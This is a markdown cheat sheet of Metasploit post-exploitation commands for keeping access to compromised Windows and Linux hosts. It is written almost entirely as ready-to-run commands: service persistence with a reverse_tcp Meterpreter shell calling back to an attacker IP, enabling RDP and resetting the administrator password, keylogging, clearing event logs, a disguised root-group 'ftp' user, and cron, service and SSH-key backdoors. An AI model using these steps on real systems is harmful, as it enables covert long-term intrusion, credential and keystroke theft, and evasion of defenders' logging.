# Establishing Persistence With Metasploit

## Establishing Persistence With Metasploit

## Windows Persistence

### Meterpreter

```bash
use exploit/windows/local/persistence_service
set SESSION 1
run
#By default persistence, the local exploit module uses the following payload and local port for reverse connection.
#Payload: windows/meterpreter/reverse_tcp
#LHOST: Attack IP Address.
#LPORT: 4444
```

**After successfully maintained access. Start another msfconsole and run multi handler to re-gain access.**

```bash
msfconsole -q
use exploit/multi/handler
set LHOST 10.10.1.2
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
exploit
```

**Switch back to the active meterpreter session and reboot the machine.**

```bash
sessions -i 1
reboot
```

**Also, the backdoor is running as a service. Even if the session gets killed we would again gain it by re-running the Metasploit multi-handler. In this case, we exit the session and run the handler to gain the session again.**

```bash
exit
exploit
```

### Enabling RDP

```bash
use post/windows/manage/enable_rdp
set SESSION 1
run
```

#### Interact with the meterpreter shell and change the administrator password.

```bash
sessions -i 1
shell
net user administrator hacker_123321
```

#### Connect to the RDP service using xfreerdp utility and administrator account.

```bash
xfreerdp /u:administrator /p:hacker_123321 /v:10.0.0.68
```

### Windows Keylogging

```bash
migrate -N explorer.exe
keyscan_start
keyscan_dump
```

### Clear Windows Event Logs

```bash
clearev
```

## Linux Persistence

### Manual

```bash
#create user account with services name
useradd -m ftp -s /bin/bash -d /opt
passwd ftp
usermod -aG root ftp
usermod -u 7 ftp
usermod -g 7 ftp
groups ftp
```

### Metasploit Module

```bash
post/linux/manage/cron_persistence
exploit/linux/local/service_persistence
#make sure the session is meterpreter shell or better
post/linux/manage/sshkey_persistence
set CREATESSHFOLDER true
loot
chmod 0400 $file
ssh -i ssh_key root@192.182.80.3
```

